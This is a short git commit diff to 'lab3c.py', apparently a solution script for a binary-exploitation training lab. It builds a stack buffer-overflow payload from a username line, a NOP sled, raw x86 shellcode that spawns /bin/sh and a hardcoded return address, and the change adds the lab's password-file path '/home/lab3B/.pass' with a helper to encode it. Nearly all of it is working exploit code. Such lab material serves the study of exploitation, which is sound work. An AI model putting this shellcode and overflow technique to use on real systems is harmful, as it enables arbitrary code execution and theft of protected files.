721d6efafd47b265525bc7ef8e8e67e0f5fb510f
Kamil Frankowicz <fumfi.255@gmail.com>
2018-01-12 09:39:46 +0100

    Update lab3c.py

--- lab3c.py
+++ lab3c.py
@@ -5,11 +5,14 @@ shellcode = ""
 USERNAME = "rpisec\n"
 BIN_SH = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
 BUF_ADDR = "\x5C\xF5\xFF\xBF"
+FLAG = "/home/lab3B/.pass"
+
 
 def convert_string_to_le_hex():
     return binascii.unhexlify(binascii.hexlify(FLAG)[::-1])
 
 
+flag_path = convert_string_to_le_hex()
 shellcode += USERNAME
 shellcode += "\x90" * 20
 shellcode += BIN_SH
